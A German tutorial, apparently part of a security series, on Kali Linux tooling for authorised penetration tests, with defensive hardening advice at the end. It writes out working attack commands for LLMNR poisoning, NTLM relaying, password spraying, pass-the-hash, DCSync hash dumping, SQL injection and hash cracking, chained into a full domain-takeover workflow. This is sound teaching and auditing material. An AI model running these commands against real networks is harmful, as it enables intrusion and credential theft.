# Ransomware – Band 27: Kali Linux – Werkzeug-Ökosystem und Tool-Chaining

Technischer Deep Dive: System-Architektur, Bereitstellungsmodelle, PTES-Methodik, kategorisierte Toolchains (Recon, Active Directory, Web, Password Cracking), automatisierte Audit-Workflows und SIEM/EDR-Detektion.

---

## 1. System-Architektur & Bereitstellung von Kali Linux

Kali Linux (gepflegt von Offensive Security) ist das weltweite Referenz-Betriebssystem für autorisierte Penetrationstests, Red-Teaming und forensische Sicherheitsüberprüfungen. Es basiert auf Debian Testing und folgt einem kontinuierlichen Rolling-Release-Modell (`kali-rolling`).

```
+----------------------------------------------------------------------------+
| Kali Linux System- und Bereitstellungsarchitektur                          |
+----------------------------------------------------------------------------+
| [ Paket-Management & Repositories ]                                        |
|   - Base: Debian Testing mit angepassten Kernel-Patches (Wifi Injection)   |
|   - Metapakete:                                                            |
|     * kali-linux-core       -> Minimales Basissystem                      |
|     * kali-linux-default    -> Standard-Toolset für Pentester             |
|     * kali-linux-everything -> Vollständige Bibliothek (>600 Werkzeuge)    |
|                                                                            |
| [ Bereitstellungsformen ]                                                  |
|   1. Bare-Metal / Laptop: Maximale Hardwarebeschleunigung (GPU Cracking)   |
|   2. Virtual Machine: VMware / VirtualBox mit Guest Additions              |
|   3. WSL2 (Windows): kali-win-kex (Win-KeX) für nahtlose XFCE-GUI         |
|   4. Docker / Container: kali-linux/kali-rolling für CI/CD Audit Pipelines |
|   5. Live-USB: Encrypted Persistence (LUKS) mit 'Nuke'-Sicherheitsoption   |
+----------------------------------------------------------------------------+
```

### 1.1 Bereitstellung & Paketverwaltung

```bash
# Systemaktualisierung auf den neuesten Rolling-Stand:
sudo apt update && sudo apt dist-upgrade -y

# Gezielte Installation thematischer Metapakete:
sudo apt install -y kali-tools-top10       # Die 10 wichtigsten Werkzeuge
sudo apt install -y kali-tools-active-directory # Komplette AD-Toolchain
sudo apt install -y kali-tools-web        # Web-Application-Testing-Suite

# Start der Win-KeX Desktop-Umgebung unter Windows WSL2:
kex --esm --sound # Startet erweiterten Sitzungsmodus mit Audio
```

---

## 2. Das Phasenmodell (PTES / NIST SP 800-115)

Professionelle Sicherheitsüberprüfungen folgen standardisierten Vorgehensweisen wie dem **Penetration Testing Execution Standard (PTES)**:

```
+-----------------------------------------------------------------------+
| Der PTES-Prüfungszyklus                                              |
+-----------------------------------------------------------------------+
| 1. Pre-Engagement Interactions: Scope, RoE (Rules of Engagement)      |
| 2. Intelligence Gathering: Reconnaissance (OSINT, DNS, Portscan)      |
| 3. Threat Modeling: Identifikation von Schwachstellenpfaden           |
| 4. Vulnerability Analysis: Verifikation von Fehlkonfigurationen      |
| 5. Exploitation: Autorisierter Nachweis des Zugriffs                  |
| 6. Post-Exploitation: Privileg-Eskalation, AD-Enumeration, Impact     |
| 7. Reporting & Cleanup: Dokumentation, Risikobewertung, Härtung       |
+-----------------------------------------------------------------------+
```

---

## 3. Reconnaissance & Network Discovery Toolchain

### 3.1 Nmap (Network Mapper) – Das Fundament der Erkennung

Nmap scannt IP-Netzwerke, identifiziert offene Ports, Betriebssysteme und Dienstversionen.

#### Wichtige Parameter & Syntax:
| Flag | Funktion | Technische Erklärung |
|---|---|---|
| `-sS` | TCP SYN Stealth Scan | Sendet SYN, empfängt SYN/ACK, antwortet mit RST (bricht Handshake ab, loggt weniger) |
| `-sV` | Version Detection | Inspiziert Banner und vergleicht Antworten mit Signaturdatenbank |
| `-O` | OS Fingerprinting | Analysiert TCP-Window-Size, IP-ID und Sequenznummern-Verhalten |
| `-p-` | Alle Ports (1-65535) | Verhindert, dass Dienste auf Nicht-Standard-Ports übersehen werden |
| `-T4` | Timing Template | Aggressives Timing, optimiert für schnelle LAN-Netzwerke |
| `--script` | Nmap Scripting Engine | Führt Lua-Skripte zur Schwachstellenprüfung aus |
| `-oA` | Output All Formats | Exportiert gleichzeitig in Text (`.nmap`), XML (`.xml`) und Grepable (`.gnmap`) |

#### Standard-Scanbefehl für Subnetze:
```bash
# Gründlicher Audit-Scan gegen ein Ziel-Subnetz:
sudo nmap -sS -sV -O -p- -T4 --script "default,vuln" 10.0.0.0/24 -oA /tmp/audit_scan_results
```

### 3.2 Masscan & Rustscan (Ultra-Fast Portscanner)

Während Nmap für detaillierte Service-Analysen ausgelegt ist, eignen sich `masscan` und `rustscan` zum Durchsuchen gigantischer Adressräume (Class B oder A) innerhalb von Minuten:
```bash
# Scannt das gesamte 10.0.0.0/8 Subnetz auf Port 445 (SMB) mit 50.000 Paketen/s:
sudo masscan 10.0.0.0/8 -p445 --rate=50000 -oL smb_hosts.txt
```

---

## 4. Active Directory & Lateral Movement Toolchain

Das Active Directory (AD) ist das Nervenzentrum von Enterprise-Infrastrukturen und das Hauptziel bei internen Sicherheitsaudits.

### 4.1 Responder – LLMNR / NBT-NS Poisoning

In Windows-Netzwerken greifen Clients bei fehlgeschlagener DNS-Namensauflösung auf veraltete Broadcast-Protokolle (LLMNR und NetBIOS Name Service) zurück.
- `responder` lauscht auf Broadcast-Anfragen und täuscht vor, der gesuchte Host (z. B. ein Fileserver oder Drucker) zu sein.
- Der Client versucht eine NTLMv2-Authentifizierung und sendet seinen Challenge-Response-Hash.

```bash
# Startet Responder auf der Netzwerkschnittstelle eth0 im Analysemodus:
sudo responder -I eth0 -rdw -v
```
*Gefundene Hashes (NetNTLMv2) werden in `/usr/share/responder/logs/` gespeichert.*

### 4.2 NTLM Relay Angriffe mit Impacket `ntlmrelayx.py`

Statt die abgefangenen NTLMv2-Hashes aufwendig per Brute-Force zu knacken, leitet `ntlmrelayx` die Authentifizierung in Echtzeit an einen anderen Server weiter, auf dem **SMB Signing** nicht erzwungen wird:

```bash
# 1. Responder so konfigurieren, dass SMB und HTTP Server deaktiviert sind (Off)
# 2. ntlmrelayx starten und gefangene Anfragen gegen Zielhosts weiterleiten:
impacket-ntlmrelayx -tf target_hosts.txt -smb2support -socks
```
*Ergebnis: Der Angreifer erhält eine interaktive administrative Session auf dem Zielsystem ohne Kenntnis des Klartextpassworts.*

### 4.3 NetExec (nxc) / CrackMapExec

Das Allzweckwerkzeug für die Automatisierung von Windows- und AD-Überprüfungen:

```bash
# 1. Passwort-Spraying: Prüft ein Passwort gegen alle Domänennutzer:
nxc smb 10.0.0.10 -u users.txt -p 'Sommer2026!' --continue-on-success

# 2. Lokale Admin-Rechte verifizieren (Pwn3d!):
nxc smb 10.0.0.0/24 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# 3. BloodHound Daten automatisch für das gesamte Subnetz sammeln:
nxc smb 10.0.0.10 -u 'AuditUser' -p 'Pass123' --bloodhound -c All
```

### 4.4 BloodHound & SharpHound (Graphentheorie im Active Directory)

BloodHound visualisiert Beziehungen, ACLs und Vertrauensstellungen im Active Directory als Graph in einer Neo4j-Datenbank.
- **Ziel:** Aufdecken versteckter Angriffspfade zum "Domain Admin" (z. B. `User A` ist Mitglied in `Gruppe B`, die Schreibrechte auf ein GPO besitzt, das auf den `Domain Controller` wirkt).

```cypher
// Typische Neo4j Cypher-Abfrage zur Suche kürzester Pfade zum Domain Admin:
MATCH p=shortestPath((u:User {name:"AUDITUSER@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p
```

### 4.5 Impacket Suite (DCSync, Remote Execution)

```bash
# DCSync Angriff via secretsdump: Simuliert einen Domain Controller und repliziert
# alle Passwort-Hashes der Domäne (erfordert Replicating Directory Changes Rechte):
impacket-secretsdump 'corp.local/admin:Password123@10.0.0.1' -just-dc-ntlm

# Pass-the-Hash Remote Execution ohne Passwort:
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.0.0.50
```

---

## 5. Web Application Testing & API Fuzzing

### 5.1 FFUF (Fast Web Fuzzer)

Extrem schneller Go-basierter Web-Fuzzer zum Auffinden verborgener Verzeichnisse, Backups und Parameter:

```bash
# Verzeichnis- und Datei-Fuzzing gegen einen Webserver:
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -u http://web01.corp.internal/FUZZ \
     -mc 200,301,302,403 \
     -e .php,.asp,.aspx,.json,.bak
```

### 5.2 SQLMap – Automatisierte SQL-Injection-Validierung

```bash
# Überprüft einen verdächtigen GET-Parameter und extrahiert Datenbanknamen:
sqlmap -u "http://target.corp.internal/products.php?id=10" \
       --batch --dbs --tamper=space2comment --risk=2 --level=2
```

---

## 6. Credential Cracking mit Hashcat

Hashcat ist das weltweit schnellste passwort-wiederherstellende Werkzeug mit GPU-OpenCL/CUDA-Beschleunigung.

```
+----------------------------------------------------------------------------+
| Wichtige Hashcat Modi und Angriffsarten                                   |
+----------------------------------------------------------------------------+
| Hash-Modi (-m):                                                            |
|   -m 1000  -> NTLM (Windows SAM / Active Directory NTDS.dit)               |
|   -m 5600  -> NetNTLMv2 (Responder / NTLM Network Challenge-Response)     |
|   -m 13100 -> Kerberoast TGS-REP (Active Directory Service Accounts)       |
|   -m 18200 -> AS-REP Roasting (Kerberos Vorauthentifizierung deaktiviert) |
|   -m 22000 -> WPA-PBKDF2-PMKID+EAPOL (WLAN Handshakes)                    |
|                                                                            |
| Angriffs-Modi (-a):                                                        |
|   -a 0 -> Dictionary Attack (Wortliste)                                    |
|   -a 3 -> Brute-Force / Mask Attack (?u?l?d?s)                             |
+----------------------------------------------------------------------------+
```

### 6.1 Praxisbefehl: Knacken von NetNTLMv2 Hashes mit Regeln

```bash
# Knacken der von Responder gesammelten Hashes mit rockyou.txt und Standardregeln:
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP.txt \
        /usr/share/wordlists/rockyou.txt \
        -r /usr/share/hashcat/rules/best64.rule \
        -O -w 3
```

---

## 7. Praktischer autorisierter End-to-End Audit-Workflow

Ein typischer Prüfablauf während eines autorisierten Netzwerk-Audits:

```
[ 1. Discovery ]
  masscan -p445,139,88,389 10.0.0.0/24 -oL targets.txt
        |
        v
[ 2. Service Fingerprint ]
  nmap -sS -sV -p445,389 -iL targets.txt -oA nmap_stage2
        |
        v
[ 3. Broadcast Poisoning ]
  sudo responder -I eth0 -v
        | (Hash abgefangen: NetNTLMv2)
        v
[ 4. Password Cracking ]
  hashcat -m 5600 hashes.txt rockyou.txt
        | (Klartextpasswort: 'Unternehmen2026!')
        v
[ 5. AD Enumeration ]
  nxc smb 10.0.0.10 -u 'Hans' -p 'Unternehmen2026!' --bloodhound
        | (Pfad gefunden: Hans -> GenericAll auf Gruppe Helpdesk -> Admin auf DC)
        v
[ 6. Privileg-Eskalation & Nachweis ]
  impacket-secretsdump corp.local/Hans:Unternehmen2026!@10.0.0.1
        |
        v
[ 7. Härtungsbericht & Remediation ]
```

---

## 8. Defensive Erkennung & Härtung gegen Kali-Werkzeuge

Administratoren und SOC-Teams können die Signaturen dieser Werkzeuge zuverlässig detektieren und unterbinden:

### 8.1 Drei fundamentale Härtungsmaßnahmen gegen AD-Tools
1. **LLMNR und NetBIOS deaktivieren (Neutralisiert Responder):**
   - Gruppenrichtlinie: `Computerkonfiguration -> Administrative Vorlagen -> Netzwerk -> DNS-Client -> LLMNR-Abfrageauflösung deaktivieren` auf **Aktiviert** setzen.
2. **SMB- und LDAP-Signing erzwingen (Neutralisiert NTLM-Relaying):**
   - GPO: `Microsoft-Netzwerk (Server): Digitale Signaturen für Kommunikation immer erforderlich` auf **Aktiviert** setzen.
   - LDAP Channel Binding und Signing auf Domain Controllern aktivieren.
3. **Ereignisprotokollierung (Event ID 4624 / 4625 / 4672):**
   - Überwachung anomaler Login-Typen (Typ 3 = Netzwerk-Login via Impacket).
   - SIEM-Regel zur Erkennung von `impacket`-typischen Service-Namen (z. B. 8-Zeichen Zufallspfade in `ADMIN$`).

---

## Quellen
- [Q89] Offensive Security – Kali Linux Official Documentation & Architecture
- [Q90] Penetration Testing Execution Standard (PTES) – Technical Guidelines
- [Q91] NIST SP 800-115 – Technical Guide to Information Security Testing and Assessment
- [Q92] Gordon Lyon – Nmap Network Scanning: The Official Nmap Project Guide
